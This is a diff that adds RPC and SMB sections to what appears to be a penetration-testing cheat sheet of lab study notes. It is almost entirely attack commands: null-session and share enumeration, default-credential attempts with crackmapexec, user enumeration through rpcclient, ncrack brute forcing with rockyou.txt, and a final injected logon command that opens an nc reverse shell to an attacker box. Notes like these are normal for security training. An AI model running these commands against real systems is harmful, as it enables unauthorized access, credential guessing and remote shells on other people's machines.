@@ -76,3 +76,47 @@ rpcclient --user="" --command=enumprivs 1 -N 10.10.10.10
 rpcinfo –p 10.10.10.10
 rpcbind -p 10.10.10.10
 ```
+
+# RPC (135)
+
+```bash
+rpcdump.py 10.11.1.121 -p 135
+rpcdump.py 10.11.1.121 -p 135 | grep ncacn_2 np // get pipe names
+rpcmap.py ncacn_ip_tcp:10.11.1.121[135]
+```
+
+# SMB (139 & 445)
+
+[https://0xdf.gitlab.io/2018/12/02/pwk-notes-smb-enumeration-checklist-update1.html](https://0xdf.gitlab.io/2018/12/02/pwk-notes-smb-enumeration-checklist-update1.html)
+
+```bash
+nmap --script smb-protocols 10.10.10.10
+smbclient -L //10.10.10.10
+smbclient -L //10.10.10.10 -N // No password (SMB Null session)
+smbclient --no-pass -L 10.10.10.10
+smbclient //10.10.10.10/share_name
+smbmap -H 10.10.10.10
+smbmap -H 10.10.10.10 -u '' -p ''
+smbmap -H 10.10.10.10 -s share_name
+crackmapexec smb 10.10.10.10 -u '' -p '' --shares
+crackmapexec smb 10.10.10.10 -u 'sa' -p '' --shares
+crackmapexec smb 10.10.10.10 -u 'sa' -p 'sa' --shares
+crackmapexec smb 10.10.10.10 -u '' -p '' --share share_name
+enum4linux -a 10.10.10.10
+rpcclient -U "" 10.10.10.10
+      * enumdomusers
+      * enumdomgroups
+      * queryuser [rid]
+      * getdompwinfo
+      * getusrdompwinfo [rid]
+ncrack -u username -P rockyou.txt -T 5 10.10.10.10 -p smb -v
+mount -t cifs "//10.1.1.1/share/" /mnt/wins
+mount -t cifs "//10.1.1.1/share/" /mnt/wins -o vers=1.0,user=root,uid=0
+
+# SMB Shell to Reverse Shell :
+
+ smbclient -U "username%password" //192.168.0.116/sharename
+ smb> logon “/=nc ‘attack box ip’ 4444 -e /bin/bash"
+
+```
+
